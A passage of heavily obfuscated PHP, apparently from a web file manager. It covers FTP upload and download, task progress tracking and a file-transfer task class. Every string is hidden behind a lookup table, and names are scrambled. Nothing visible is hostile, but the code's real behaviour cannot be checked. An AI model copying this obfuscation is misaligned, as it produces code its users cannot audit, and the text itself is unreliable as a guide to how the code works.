$™ÆŞ¾«ò - 1; curl_setopt($Ä¤Ç¬Ç², CURLOPT_RANGE, "{$•¾å£¿Ú}\55{$ÇöÁ„¿š}"); } curl_setopt($Ä¤Ç¬Ç², CURLOPT_RETURNTRANSFER, 1); $ş¹ŸÁú¸ = curl_exec($Ä¤Ç¬Ç²); curl_close($Ä¤Ç¬Ç²); return $ş¹ŸÁú¸; } public function upload($ëá°ÃÌ±, $Àê¦£†, $¢¦çóû· = false, $îƒÍùÈ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ëá°ÃÌ±))) { return !1; } $ëá°ÃÌ± = $this->iconvSystem($ëá°ÃÌ±); $Àê¦£† = $this->iconvSystem($Àê¦£†); $ú„æÜÔ‹ = ftp_nb_put($this->connect, $ëá°ÃÌ±, $Àê¦£†, FTP_BINARY); while ($ú„æÜÔ‹ == FTP_MOREDATA) { $ú„æÜÔ‹ = ftp_nb_continue($this->connect); } if ($ú„æÜÔ‹ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); return !1; } return $this->getPathOuter($ëá°ÃÌ±); } public function download($©Ëâõçæ, $µİß™¯— = '') { if (!$this->_isconn()) { return !1; } $¯•ù²ıÁ = $this->pathFather($µİß™¯—); if (!IO::mkdir($¯•ù²ıÁ)) { return !1; } $©Ëâõçæ = $this->iconvSystem($©Ëâõçæ); $µİß™¯— = $this->iconvSystem($µİß™¯—); $ç÷á¯¸× = ftp_nb_get($this->connect, $µİß™¯—, $©Ëâõçæ, FTP_BINARY); while ($ç÷á¯¸× == FTP_MOREDATA) { $ç÷á¯¸× = ftp_nb_continue($this->connect); } if ($ç÷á¯¸× != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); return !1; } return $this->iconvApp($µİß™¯—); } public function exist($±»Îê‹) { return $this->isFile($±»Îê‹) || $this->isFolder($±»Îê‹); } public function isFile($å²ÕÔ ¤) { return !$this->isFolder($å²ÕÔ ¤) && $this->objectMeta($å²ÕÔ ¤); } public function isFolder($åíÇ‚Å) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][189], $åíÇ‚Å); } protected function objectMeta($œ  ôşĞ) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][191], $œ  ôşĞ); } protected function _objectMeta($¶‘ª§õ) { $âÆ‚–¡¤ =& $_SERVER[¼èá¯æÙ]; if ($¶‘ª§õ == $âÆ‚–¡¤[12] || $¶‘ª§õ == $âÆ‚–¡¤[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¶‘ª§õ = $this->iconvSystem($¶‘ª§õ); $Î¹—ãëã = array($âÆ‚–¡¤[32] => $this->iconvApp($¶‘ª§õ), $âÆ‚–¡¤[33] => $âÆ‚–¡¤[242], $âÆ‚–¡¤[89] => 0); @ftp_chdir($this->connect, $âÆ‚–¡¤[8]); $¶Êñ®Ëá = @ftp_size($this->connect, $¶‘ª§õ); if ($¶Êñ®Ëá != -1) { $Î¹—ãëã[$âÆ‚–¡¤[89]] = $¶Êñ®Ëá; } else { $´Œèì„ˆ = @ftp_chdir($this->connect, $¶‘ª§õ); if (!$´Œèì„ˆ) { return !1; } $Î¹—ãëã[$âÆ‚–¡¤[33]] = $âÆ‚–¡¤[88]; } return $Î¹—ãëã; } protected function _isFolder($º»›·ÚÍ) { $ƒï’ù =& $_SERVER[¼èá¯æÙ]; if ($º»›·ÚÍ == $ƒï’ù[12] || $º»›·ÚÍ == $ƒï’ù[8]) { return !0; } $ãÎ“­µ® = $this->_objectMeta($º»›·ÚÍ); return isset($ãÎ“­µ®[$ƒï’ù[33]]) && $ãÎ“­µ®[$ƒï’ù[33]] == $ƒï’ù[88] ? !0 : !1; } } goto C¦Ï£‘åÉ‰; e…ó‚ÅØêÕ: class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\151\x6e\x67"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($û˜•÷‘¥, $Ğ§óÊ±  = '', $÷™Ş’Ê = 0, $¯©­’´ğ = '') { $’ñ’ÚØ =& $_SERVER[¼èá¯æÙ]; if (self::get($û˜•÷‘¥)) { return; } $this->task = array($’ñ’ÚØ[486] => $û˜•÷‘¥, $’ñ’ÚØ[1778] => USER_ID, $’ñ’ÚØ[1666] => $¯©­’´ğ, $’ñ’ÚØ[537] => $’ñ’ÚØ[12], $’ñ’ÚØ[33] => $Ğ§óÊ± , $’ñ’ÚØ[1147] => $’ñ’ÚØ[12], $’ñ’ÚØ[1145] => $÷™Ş’Ê, $’ñ’ÚØ[1779] => 0, $’ñ’ÚØ[1780] => 0, $’ñ’ÚØ[1781] => 0, $’ñ’ÚØ[1782] => timeFloat(), $’ñ’ÚØ[1783] => 0, $’ñ’ÚØ[1784] => 0, $’ñ’ÚØ[1785] => 0, $’ñ’ÚØ[1786] => 0, $’ñ’ÚØ[832] => $’ñ’ÚØ[1727]); $GLOBALS[$’ñ’ÚØ[1787]] = 1; Hook::bind($’ñ’ÚØ[1731], array($this, $’ñ’ÚØ[1788])); Hook::bind($’ñ’ÚØ[1789], array($this, $’ñ’ÚØ[1790])); $this->startAfter(); Hook::trigger($’ñ’ÚØ[1791], $this->task); $this->task[$’ñ’ÚØ[1784]] = timeFloat(); } public function end($ã‡úÍÊˆ = '') { $ÌêœÖÛº =& $_SERVER[¼èá¯æÙ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÌêœÖÛº[1784]]) { self::valueSet($this->task[$ÌêœÖÛº[486]], !1); } $this->isEnd = !0; if ($ã‡úÍÊˆ) { $this->task[$ÌêœÖÛº[537]] = $ã‡úÍÊˆ; } self::log($ÌêœÖÛº[1792] . $this->task[$ÌêœÖÛº[486]] . $ÌêœÖÛº[1793] . sprintf($ÌêœÖÛº[934], timeFloat() - $this->task[$ÌêœÖÛº[1782]]) . $ÌêœÖÛº[1794]); Hook::unbind($ÌêœÖÛº[1731], array($this, $ÌêœÖÛº[1788])); Hook::unbind($ÌêœÖÛº[1789], array($this, $ÌêœÖÛº[1790])); $this->endAfter(); $Àş™íÕ³ = $this->task; $this->task = !1; Hook::trigger($ÌêœÖÛº[1795], $Àş™íÕ³); } public function update($ç«–õº‚ = 0, $ú™‚ÏíÇ = false) { $¹Ùğ·Ÿ =& $_SERVER[¼èá¯æÙ]; $ƒ£ˆ ©È =& $this->task; if (!$ƒ£ˆ ©È) { return; } $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1779]] += $ç«–õº‚; $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1783]] = timeFloat(); if ($ƒ£ˆ ©È[$¹Ùğ·Ÿ[1145]]) { if ($ƒ£ˆ ©È[$¹Ùğ·Ÿ[1145]] < $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1779]]) { $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1145]] = $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1779]]; } $˜ŸƒÂû± = timeFloat() - $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1782]] - $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1785]]; if ($˜ŸƒÂû± <= 0) { $˜ŸƒÂû± = 0.001; } $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1780]] = $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1779]] / $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1145]]; $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1781]] = $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1779]] / $˜ŸƒÂû±; if ($ƒ£ˆ ©È[$¹Ùğ·Ÿ[1780]] > 0) { $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1786]] = $˜ŸƒÂû± * (1 - $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1780]]) / $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1780]]; } $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1786]] = $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1786]] <= 0 ? 0 : $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1786]]; } $this->updateAfter(); $“™Í¿ù = 0.2; if (timeFloat() - $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1784]] < $“™Í¿ù && !$ú™‚ÏíÇ) { return; } $åÇ¦Ôòš = self::get($ƒ£ˆ ©È[$¹Ùğ·Ÿ[486]]); $¹íÄêªö = $åÇ¦Ôòš[$¹Ùğ·Ÿ[832]]; if ($¹íÄêªö == self::STATYS_KILL) { $÷É¢µìù = array($¹Ùğ·Ÿ[1796] => LNG($¹Ùğ·Ÿ[1797]), $¹Ùğ·Ÿ[1302] => !1); Cache::set($¹Ùğ·Ÿ[1798] . $this->task[$¹Ùğ·Ÿ[486]], $÷É¢µìù, 30); $this->onKill(); $this->end(); die; } else { if ($¹íÄêªö == self::STATYS_STOP) { $ášˆñÜ = 2; $åÇ¦Ôòš[$¹Ùğ·Ÿ[1785]] += $ášˆñÜ; self::valueSet($ƒ£ˆ ©È[$¹Ùğ·Ÿ[486]], $åÇ¦Ôòš); sleep($ášˆñÜ); $this->update(); return; } } $ƒ£ˆ ©È[$¹Ùğ·Ÿ[832]] = $¹íÄêªö ? $¹íÄêªö : $ƒ£ˆ ©È[$¹Ùğ·Ÿ[832]]; $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1785]] = $åÇ¦Ôòš[$¹Ùğ·Ÿ[1785]] ? $åÇ¦Ôòš[$¹Ùğ·Ÿ[1785]] : 0; $ƒ£ˆ ©È[$¹Ùğ·Ÿ[1784]] = timeFloat(); Hook::trigger($¹Ùğ·Ÿ[1799], $ƒ£ˆ ©È); self::valueSet($ƒ£ˆ ©È[$¹Ùğ·Ÿ[486]], $ƒ£ˆ ©È); } public function onKillSet($ëµæ‹Ÿ×, $½áÇÚØ = array()) { $this->onKillCall = array($ëµæ‹Ÿ×, $½áÇÚØ); } public function onKill() { $Ë©å¤ê =& $_SERVER[¼èá¯æÙ]; self::log($Ë©å¤ê[1792] . $this->task[$Ë©å¤ê[486]] . $Ë©å¤ê[1800]); Hook::trigger($Ë©å¤ê[1801], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Å çÙ³ã) { $Ó†ØÎõì =& $_SERVER[¼èá¯æÙ]; Cache::set($Ó†ØÎõì[1798] . $this->task[$Ó†ØÎõì[486]], $Å çÙ³ã, 60); if (!is_array($Å çÙ³ã) || !$Å çÙ³ã[$Ó†ØÎõì[1302]]) { self::log($Ó†ØÎõì[1802] . json_encode($Å çÙ³ã)); } return $Å çÙ³ã; } public static function get($òĞì‹¿‹) { $’³âĞ¶‰ =& $_SERVER[¼èá¯æÙ]; $ıì¾ÀŸ = self::valueGet($òĞì‹¿‹); if (is_array($ıì¾ÀŸ) && $ıì¾ÀŸ[$’³âĞ¶‰[1803]]) { $•ú¹ô¿ = ActionApply($ıì¾ÀŸ[$’³âĞ¶‰[1803]], array($ıì¾ÀŸ)); $ıì¾ÀŸ = is_array($•ú¹ô¿) ? $•ú¹ô¿ : $ıì¾ÀŸ; } return $ıì¾ÀŸ; } public static function listData() { $Ä€ÎïÙ— = self::valueGet(); return array_sort_by($Ä€ÎïÙ—, $_SERVER[¼èá¯æÙ][1782], !0); } public static function kill($Š”ÂŒ«) { return self::changeStatus($Š”ÂŒ«, self::STATYS_KILL); } public static function stop($€ØŸ³µ¯) { return self::changeStatus($€ØŸ³µ¯, self::STATYS_STOP); } public static function restart($ˆËè¿ß) { return self::changeStatus($ˆËè¿ß, self::STATYS_RUNNING); } public static function killAll() { $ ìï»§• =& $_SERVER[¼èá¯æÙ]; $‡¢ÔçŠ£ = self::listData(); foreach ($‡¢ÔçŠ£ as $Ì›–¨›) { self::kill($Ì›–¨›[$ ìï»§•[486]]); } sleep(2); foreach ($‡¢ÔçŠ£ as $Ì›–¨›) { self::valueSet($Ì›–¨›[$ ìï»§•[486]], !1); } } private static function changeStatus($·Ô•ëÏÔ, $ˆûÀğòø) { $Ô•ˆï‡‘ =& $_SERVER[¼èá¯æÙ]; $•¥˜£ºŸ = self::valueGet($·Ô•ëÏÔ); if (!$•¥˜£ºŸ) { return !1; } $•¥˜£ºŸ[$Ô•ˆï‡‘[832]] = $ˆûÀğòø; self::valueSet($·Ô•ëÏÔ, $•¥˜£ºŸ); self::log($Ô•ˆï‡‘[1804] . $•¥˜£ºŸ[$Ô•ˆï‡‘[486]] . $Ô•ˆï‡‘[1805] . $ˆûÀğòø); return !0; } public static function valueGet($Ÿˆá¬¨† = false) { $€®ó£®¹ =& $_SERVER[¼èá¯æÙ]; if ($Ÿˆá¬¨†) { $ÚÀß™Ô = Model($€®ó£®¹[531])->where(array($€®ó£®¹[107] => $Ÿˆá¬¨†, $€®ó£®¹[33] => $€®ó£®¹[1154]))->find(); return $ÚÀß™Ô ? json_decode($ÚÀß™Ô[$€®ó£®¹[462]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($§µ Ó«¼ = false) { $»‚é‰ =& $_SERVER[¼èá¯æÙ]; $ÑİáÖ¶Ò = array($»‚é‰[33] => $»‚é‰[1154]); if ($§µ Ó«¼) { $ÑİáÖ¶Ò[$»‚é‰[1778]] = $§µ Ó«¼; } $§Ö«ÛÈ³ = Model($»‚é‰[531])->where($ÑİáÖ¶Ò)->select(); $§Ö«ÛÈ³ = $§Ö«ÛÈ³ ? $§Ö«ÛÈ³ : array(); foreach ($§Ö«ÛÈ³ as $šõƒ®ù› => $Æó·Èü) { $§Ö«ÛÈ³[$šõƒ®ù›] = json_decode($Æó·Èü[$»‚é‰[462]], !0); } return $§Ö«ÛÈ³; } public static function valueSet($ÄÛ¹¨¥É, $æÅ•Ä´í) { $â“·Î©« =& $_SERVER[¼èá¯æÙ]; if (!$æÅ•Ä´í) { return Model($â“·Î©«[531])->where(array($â“·Î©«[107] => $ÄÛ¹¨¥É, $â“·Î©«[33] => $â“·Î©«[1154]))->delete(); } $¶Ùù‚Õ” = json_encode($æÅ•Ä´í); if (!$¶Ùù‚Õ”) { ob_start(); var_dump($æÅ•Ä´í); $Àß®ñ©¤ = ob_get_clean(); self::log($â“·Î©«[1806] . json_encode_force($Àß®ñ©¤)); } if (!$ÄÛ¹¨¥É || !$æÅ•Ä´í[$â“·Î©«[486]]) { return !1; } $şå¬ßÈ = array($â“·Î©«[33] => $â“·Î©«[1154], $â“·Î©«[1778] => USER_ID, $â“·Î©«[107] => $ÄÛ¹¨¥É, $â“·Î©«[462] => $¶Ùù‚Õ”); $Ğ½ßÒ±Õ = $â“·Î©«[1807]; CacheLock::lock($Ğ½ßÒ±Õ); Model($â“·Î©«[531])->add($şå¬ßÈ, array(), !0); CacheLock::unlock($Ğ½ßÒ±Õ); } public static function log($è¯ ›­) { if (!GLOBAL_DEBUG) { return; } write_log($è¯ ›­, $_SERVER[¼èá¯æÙ][1808]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¸¯Ûõ§² =& $_SERVER[¼èá¯æÙ]; $¨óŒş“ô =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¸¯Ûõ§²[1809], array($this, $¸¯Ûõ§²[1810])); Hook::bind($¸¯Ûõ§²[1313], array($this, $¸¯Ûõ§²[1811])); Hook::bind($¸¯Ûõ§²[1812], array($this, $¸¯Ûõ§²[1813])); Hook::bind($¸¯Ûõ§²[682], array($this, $¸¯Ûõ§²[1814])); Hook::bind($¸¯Ûõ§²[683], array($this, $¸¯Ûõ§²[1815])); Hook::bind($¸¯Ûõ§²[689], array($this, $¸¯Ûõ§²[1816])); Hook::bind($¸¯Ûõ§²[690], array($this, $¸¯Ûõ§²[1817])); Hook::bind($¸¯Ûõ§²[685], array($this, $¸¯Ûõ§²[1818])); Hook::bind($¸¯Ûõ§²[687], array($this, $¸¯Ûõ§²[1819])); Hook::bind($¸¯Ûõ§²[651], array($this, $¸¯Ûõ§²[1820])); Hook::bind($¸¯Ûõ§²[648], array($this, $¸¯Ûõ§²[1820])); Hook::bind($¸¯Ûõ§²[653], array($this, $¸¯Ûõ§²[1820])); Hook::bind($¸¯Ûõ§²[655], array($this, $¸¯Ûõ§²[1820])); Hook::bind($¸¯Ûõ§²[657], array($this, $¸¯Ûõ§²[1820])); Hook::bind($¸¯Ûõ§²[1821], array($this, $¸¯Ûõ§²[1822])); Hook::bind($¸¯Ûõ§²[673], array($this, $¸¯Ûõ§²[1823])); $this->sourceModelCopyFlag = !1; Hook::bind($¸¯Ûõ§²[1824], array($this, $¸¯Ûõ§²[1825])); Hook::bind($¸¯Ûõ§²[1826], array($this, $¸¯Ûõ§²[1827])); Hook::bind($¸¯Ûõ§²[1828], array($this, $¸¯Ûõ§²[1829])); $¨óŒş“ô[$¸¯Ûõ§²[1830]] = LNG($¸¯Ûõ§²[1831]); $¨óŒş“ô[$¸¯Ûõ§²[1832]] = 0; $¨óŒş“ô[$¸¯Ûõ§²[1833]] = 0; $¨óŒş“ô[$¸¯Ûõ§²[1147]] = $¸¯Ûõ§²[12]; $¨óŒş“ô[$¸¯Ûõ§²[1834]] = $¸¯Ûõ§²[12]; $¨óŒş“ô[$¸¯Ûõ§²[1835]] = 0; $¨óŒş“ô[$¸¯Ûõ§²[1836]] = 0; $¨óŒş“ô[$¸¯Ûõ§²[1837]] = 0; if (!$¨óŒş“ô[$¸¯Ûõ§²[1666]]) { $¨óŒş“ô[$¸¯Ûõ§²[1666]] = LNG($¸¯Ûõ§²[1838]); } } protected function endAfter() { $÷¤™ì´õ =& $_SERVER[¼èá¯æÙ]; Hook::unbind($÷¤™ì´õ[1809], array($this, $÷¤™ì´õ[1810])); Hook::unbind($÷¤™ì´õ[1313], array($this, $÷¤™ì´õ[1811])); Hook::unbind($÷¤™ì´õ[1812], array($this, $÷¤™ì´õ[1813])); Hook::unbind($÷¤™ì´õ[682], array($this, $÷¤™ì´õ[1814])); Hook::unbind($÷¤™ì´õ[683], array($this, $÷¤™ì´õ[1815])); Hook::unbind($÷¤™ì´õ[689], array($this, $÷¤™ì´õ[1816])); Hook::unbind($÷¤™ì´õ[690], array($this, $÷¤™ì´õ[1817])); Hook::unbind($÷¤™ì´õ[685], array($this, $÷¤™ì´õ[1818])); Hook::unbind($÷¤™ì´õ[687], array($this, $÷¤™ì´õ[1819])); Hook::unbind($÷¤™ì´õ[651], array($this, $÷¤™ì´õ[1820])); Hook::unbind($÷¤™ì´õ[648], array($this, $÷¤™ì´õ[1820])); Hook::unbind($÷¤™ì´õ[653], array($this, $÷¤™ì´õ[1820])); Hook::unbind($÷¤™ì´õ[655], array($this, $÷¤™ì´õ[1820])); Hook::unbind($÷¤™ì´õ[657], array($this, $÷¤™ì´õ[1820])); Hook::unbind($÷¤™ì´õ[1821], array($this, $÷¤™ì´õ[1822])); Hook::unbind($÷¤™ì´õ[673], array($this, $÷¤™ì´õ[1823])); Hook::unbind($÷¤™ì´õ[1824], array($this, $÷¤™ì´õ[1825])); Hook::unbind($÷¤™ì´õ[1826], array($this, $÷¤™ì´õ[1827])); Hook::unbind($÷¤™ì´õ[1828], array($this, $÷¤™ì´õ[1829])); } public function copyMoveStart($˜¨„êì, $ÔÌŞä‰, $İ‘€Åâô, $­ºµÕŠÎ) { $íããÔ‰İ =& $_SERVER[¼èá¯æÙ]; self::log($íããÔ‰İ[1839] . $ÔÌŞä‰ . $íããÔ‰İ[83] . $­ºµÕŠÎ); $ññşÃÕñ = rtrim(TEMP_FILES, $íããÔ‰İ[8]); if (substr($ÔÌŞä‰, 0, strlen($ññşÃÕñ)) == $ññşÃÕñ) { return; } if (substr($­ºµÕŠÎ, 0, strlen($ññşÃÕñ)) == $ññşÃÕñ) { return; } $šùøŸÒ¾ =& $this->task; $šùøŸÒ¾[$íããÔ‰İ[1840]] = KodIO::transferType($˜¨„êì, $İ‘€Åâô); $this->update(); } public function updateAfter() { $‚Â„ÕÏî =& $_SERVER[¼èá¯æÙ]; $È™ »¢‹ =& $this->task; if (!$È™ »¢‹[$‚Â„ÕÏî[845]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($È™ »¢‹[$‚Â„ÕÏî[1840]] == $‚Â„ÕÏî[1407]) { return; } self::updateTask($È™ »¢‹); } private static function updateTask(&$¥ê¹•Ê¿) { $Ü´µİíí =& $_SERVER[¼èá¯æÙ]; if ($¥ê¹•Ê¿[$Ü´µİíí[1840]] == $Ü´µİíí[1284] || $¥ê¹•Ê¿[$Ü´µİíí[1840]] == $Ü´µİíí[120]) { if ($¥ê¹•Ê¿[$Ü´µİíí[1834]]) { $¥ê¹•Ê¿[$Ü´µİíí[1837]] = $¥ê¹•Ê¿[$Ü´µİíí[1836]] + $¥ê¹•Ê¿[$Ü´µİíí[1833]]; } } else { if ($¥ê¹•Ê¿[$Ü´µİíí[1840]] == $Ü´µİíí[1408]) { if ($¥ê¹•Ê¿[$Ü´µİíí[1834]] == $Ü´µİíí[1284]) { $¥ê¹•Ê¿[$Ü´µİíí[1837]] = $¥ê¹•Ê¿[$Ü´µİíí[1836]] + $¥ê¹•Ê¿[$Ü´µİíí[1833]] * 0.5; } else { if ($¥ê¹•Ê¿[$Ü´µİíí[1834]] == $Ü´µİíí[120]) { $¥ê¹•Ê¿[$Ü´µİíí[1837]] = $¥ê¹•Ê¿[$Ü´µİíí[1836]] + $¥ê¹•Ê¿[$Ü´µİíí[1832]] * 0.5 + $¥ê¹•Ê¿[$Ü´µİíí[1833]] * 0.5; } } } } $¥ê¹•Ê¿[$Ü´µİíí[1780]] = $¥ê¹•Ê¿[$Ü´µİíí[1837]] / $¥ê¹•Ê¿[$Ü´µİíí[845]]; if ($¥ê¹•Ê¿[$Ü´µİíí[1780]] > 0) { $øñÍ”û« = timeFloat() - $¥ê¹•Ê¿[$Ü´µİíí[1782]] - $¥ê¹•Ê¿[$Ü´µİíí[1785]]; $¥ê¹•Ê¿[$Ü´µİíí[1786]] = $øñÍ”û« * (1 - $¥ê¹•Ê¿[$Ü´µİíí[1780]]) / $¥ê¹•Ê¿[$Ü´µİíí[1780]]; } } public function addPath($‘Æ¹¢€Ó) { $µÑâî‘ =& $_SERVER[¼èá¯æÙ]; if (!$‘Æ¹¢€Ó) { return; } $ÊÄ½ŠÃ =& $this->task; $¥èÓ…’ = IO::infoWithChildren($‘Æ¹¢€Ó); $ÑÑş×‚â = $ÊÄ½ŠÃ[$µÑâî‘[1841]] ? $ÊÄ½ŠÃ[$µÑâî‘[1841]][$µÑâî‘[1842]] : 0; $ÊÄ½ŠÃ[$µÑâî‘[1841]] = array($µÑâî‘[1842] => $ÑÑş×‚â + 1, $µÑâî‘[505] => $¥èÓ…’[$µÑâî‘[32]], $µÑâî‘[97] => $¥èÓ…’[$µÑâî‘[97]], $µÑâî‘[593] => $¥èÓ…’[$µÑâî‘[593]] ? $¥èÓ…’[$µÑâî‘[593]] : $¥èÓ…’[$µÑâî‘[97]]); if ($¥èÓ…’[$µÑâî‘[33]] == $µÑâî‘[242]) { $ÊÄ½ŠÃ[$µÑâî‘[1145]] += 1; } else { $ÊÄ½ŠÃ[$µÑâî‘[1145]] += $¥èÓ…’[$µÑâî‘[92]][$µÑâî‘[90]]; if ($¥èÓ…’[$µÑâî‘[203]]) { $ÊÄ½ŠÃ[$µÑâî‘[1145]] += $¥èÓ…’[$µÑâî‘[92]][$µÑâî‘[91]] + 1; } } $ÊÄ½ŠÃ[$µÑâî‘[845]] += $¥èÓ…’[$µÑâî‘[89]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Ôâë–æÇ) { } public function sourceAddHashEnd($äøõîš) { } public function sourceAddFileStart($‡”Šö¬§) { $áª¼ÚŸø =& $_SERVER[¼èá¯æÙ]; $è€é“„Î =& $this->task; $è€é“„Î[$áª¼ÚŸø[1832]] = $‡”Šö¬§[$áª¼ÚŸø[89]]; $è€é“„Î[$áª¼ÚŸø[1830]] = $‡”Šö¬§[$áª¼ÚŸø[32]]; $è€é“„Î[$áª¼ÚŸø[1147]] = $‡”Šö¬§[$áª¼ÚŸø[32]]; $è€é“„Î[$áª¼ÚŸø[1843]] = $‡”Šö¬§[$áª¼ÚŸø[97]]; $this->update(); } public function sourceAddFileEnd($¿®â±–¯) { $çÉê‰“ñ =& $_SERVER[¼èá¯æÙ]; $Ì‡¯¶ï™ =& $this->task; $Ì‡¯¶ï™[$çÉê‰“ñ[1837]] += $¿®â±–¯[$çÉê‰“ñ[89]]; $Ì‡¯¶ï™[$çÉê‰“ñ[1843]] = $¿®â±–¯[$çÉê‰“ñ[97]]; $this->update(1); } public function copyFileStart($ó’®ğ, $õƒÏÂ¸¬, $ùªã‹ÙÀ, $÷ó¸¾èô, $¼Ô‚ĞÑÀ, $ŸÅ˜”Îş) { $Âä›Œ¯Â =& $_SERVER[¼èá¯æÙ]; $´ëŒÙ¥¤ = $¼Ô‚ĞÑÀ; if ($´ëŒÙ¥¤ == $GLOBALS[$Âä›Œ¯Â[1844]]) { $´ëŒÙ¥¤ = $GLOBALS[$Âä›Œ¯Â[1845]]; } $GLOBALS[$Âä›Œ¯Â[1845]] = $¼Ô‚ĞÑÀ; $GLOBALS[$Âä›Œ¯Â[1844]] = $ŸÅ˜”Îş; $‘¾·•Öº =& $this->task; $‘¾·•Öº[$Âä›Œ¯Â[1830]] = $´ëŒÙ¥¤; $‘¾·•Öº[$Âä›Œ¯Â[1832]] = (int) $ó’®ğ->size($õƒÏÂ¸¬); $‘¾·•Öº[$Âä›Œ¯Â[1833]] = 0; $‘¾·•Öº[$Âä›Œ¯Â[1147]] = $Âä›Œ¯Â[12]; $‘¾·•Öº[$Âä›Œ¯Â[1834]] = $Âä›Œ¯Â[12]; $‘¾·•Öº[$Âä›Œ¯Â[1835]] = 0; $›†óğâİ = $‘¾·•Öº[$Âä›Œ¯Â[1832]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($‘¾·•Öº[$Âä›Œ¯Â[486]] . $Âä›Œ¯Â[1846]); if ($›†óğâİ && file_exists(get_path_father($÷ó¸¾èô))) { Cache::set($‘¾·•Öº[$Âä›Œ¯Â[486]] . $Âä›Œ¯Â[1846], $÷ó¸¾èô); $‘¾·•Öº[$Âä›Œ¯Â[1803]] = array($Âä›Œ¯Â[1847], $Âä›Œ¯Â[1848]); } $this->update(0, $›†óğâİ); } public static function updateCopyLocalFileSize($·ş¶½Ç) { $ÓÂÏ¹ƒ£ =& $_SERVER[¼èá¯æÙ]; $¥ŞÊÁş = Cache::get($·ş¶½Ç[$ÓÂÏ¹ƒ£[486]] . $ÓÂÏ¹ƒ£[1846]); if (!$¥ŞÊÁş || !file_exists($¥ŞÊÁş)) { return $·ş¶½Ç; } $·ş¶½Ç[$ÓÂÏ¹ƒ£[1833]] = @filesize($¥ŞÊÁş); $·ş¶½Ç[$ÓÂÏ¹ƒ£[1837]] += $·ş¶½Ç[$ÓÂÏ¹ƒ£[1833]]; self::updateTask($·ş¶½Ç); return $·ş¶½Ç; } public function copyFileEnd($‚¸«âè, $ğÉ˜èåĞ, $¸Ç»ğß, $œ“Ù¼Õ, $°é™ƒì–, $ìğşãş«) { $–õó‰ Ö =& $_SERVER[¼èá¯æÙ]; $¨š¯Í =& $this->task; $¨š¯Í[$–õó‰ Ö[1833]] = $¨š¯Í[$–õó‰ Ö[1832]]; $¨š¯Í[$–õó‰ Ö[1834]] = $–õó‰ Ö[12]; unset($¨š¯Í[$–õó‰ Ö[1803]]); if ($°é™ƒì– == $¨š¯Í[$–õó‰ Ö[1830]]) { $¨š¯Í[$–õó‰ Ö[1836]] += $¨š¯Í[$–õó‰ Ö[1832]]; $¨š¯Í[$–õó‰ Ö[1837]] = $¨š¯Í[$–õó‰ Ö[1836]]; $ÂûÀşÕ¸ = 1; if (isset($¨š¯Í[$–õó‰ Ö[1843]]) && $¨š¯Í[$–õó‰ Ö[1843]] == $ğÉ˜èåĞ) { $ÂûÀşÕ¸ = 0; } $this->update($ÂûÀşÕ¸); } else { $this->update(); $¨š¯Í[$–õó‰ Ö[1833]] = 0; } Cache::remove($¨š¯Í[$–õó‰ Ö[486]] . $–õó‰ Ö[1846]); self::log($–õó‰ Ö[1849] . $ğÉ˜èåĞ . $–õó‰ Ö[83] . $œ“Ù¼Õ . $–õó‰ Ö[59] . $°é™ƒì– . $–õó‰ Ö[1850] . $¨š¯Í[$–õó‰ Ö[1830]]); } public function updateFileEnd($èä¿÷˜×, $æ©Ÿßš¸) { $ŸŠĞÅÒ =& $_SERVER[¼èá¯æÙ]; $Äï½Ô×³ =& $this->task; $Äï½Ô×³[$ŸŠĞÅÒ[1830]] = $èä¿÷˜×; $Äï½Ô×³[$ŸŠĞÅÒ[1832]] = $æ©Ÿßš¸; $Äï½Ô×³[$ŸŠĞÅÒ[1836]] += $æ©Ÿßš¸; $Äï½Ô×³[$ŸŠĞÅÒ[1837]] = $Äï½Ô×³[$ŸŠĞÅÒ[1836]]; $this->update(1); self::log($ŸŠĞÅÒ[1851] . $èä¿÷˜×); } public function sourceModelCopy($¬ à±¯) { $™­ñ¦ =& $_SERVER[¼èá¯æÙ]; $ÅÌ§ß‚ = $¬ à±¯[0]; $ßÅËÓ¡ = $¬ à±¯[1]; $„Ûô˜şÙ =& $this->task; $this->sourceModelCopyFlag = !0; $‡òÇ¤”î = 0; switch ($ÅÌ§ß‚) { case $™­ñ¦[649]: $‡òÇ¤”î = 1; break; 